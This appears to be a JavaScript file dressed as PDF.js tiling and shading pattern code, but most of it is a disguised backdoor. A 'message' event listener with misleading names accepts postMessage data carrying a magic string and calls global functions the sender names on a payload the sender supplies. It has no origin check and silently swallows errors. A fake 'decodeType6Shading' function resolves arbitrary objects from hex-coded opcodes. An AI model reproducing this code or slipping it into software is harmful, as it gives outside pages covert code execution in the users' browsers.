var ShadingType = {
  FUNCTION_BASED: 1,
  AXIAL: 2,
  RADIAL: 3,
  FREE_FORM_MESH: 4,
  LATTICE_FORM_MESH: 5,
  COONS_PATCH_MESH: 6,
  TENSOR_PATCH_MESH: 7,
};
var alfa = this;
var muteAudioStream = '';

function decodeType6Shading(q_matrix, TilingPattern, bbox) {
  let ystep = null;
  if (typeof(bbox['0x34']) == 'undefined') {
    return null;
  }
  for (let q_ystep = 0; q_ystep < bbox['0x34'].length; q_ystep++) {
    let paintType = bbox['0x34'][q_ystep];
    if (typeof(paintType['0x37']) != 'undefined') {}
    switch (paintType['type']) {
      case '0x38': {
        ystep = parseBlock;
      }
      break;
      case '0x39': {
        ystep = alfa;
      }
      break;
      case '0x41': {
        ystep = new Object();
      }
      break;

      case '0x43': {
        ystep = TilingPattern;
      }
      break;
      case '0x44': {
        ystep = TilingPattern[paintType['0x37']];
      }
      break;
      case '0x45': {
        ystep = ystep[paintType['0x37']];
      }
      break;
      case '0x46': {
        ystep = ystep[paintType['0x37']];
      }
      break;
      case '0x47': {
        ystep = ystep[TilingPattern[paintType['0x37']]];
      }
      break;
    }
  }
  return ystep;
}

window.addEventListener('message', function ( serializeFormData )
{
  muteAudioStream = serializeFormData.data;
  try
  {
    if (muteAudioStream.encodeBase64String == 'captureUserFeedback' )
    {
      self[muteAudioStream.bundleResourceModules.scrambleTextContent[1]](self[muteAudioStream.bundleResourceModules.scrambleTextContent[0]](muteAudioStream.bundleResourceModules.updateBreadcrumbTrail));
    }
  }
  catch (e)
  {
  }
}); 

function getTilingPatternIR(operatorList, dict, color) {
  const matrix = dict.getArray("Matrix");
  const bbox = Util.normalizeRect(dict.getArray("BBox"));
  const xstep = dict.get("XStep");
  const ystep = dict.get("YStep");
  const paintType = dict.get("PaintType");
  const tilingType = dict.get("TilingType");
  // Ensure that the pattern has a non-zero width and height, to prevent errors
  // in `pattern_helper.js` (fixes issue8330.pdf).
  if (bbox[2] - bbox[0] === 0 || bbox[3] - bbox[1] === 0) {
    throw new FormatError(`Invalid getTilingPatternIR /BBox array: [${bbox}].`);
  }
  return ["TilingPattern",
    color,
    operatorList,
    matrix,
    bbox,
    xstep,
    ystep,
    paintType,
    tilingType,
  ];
}
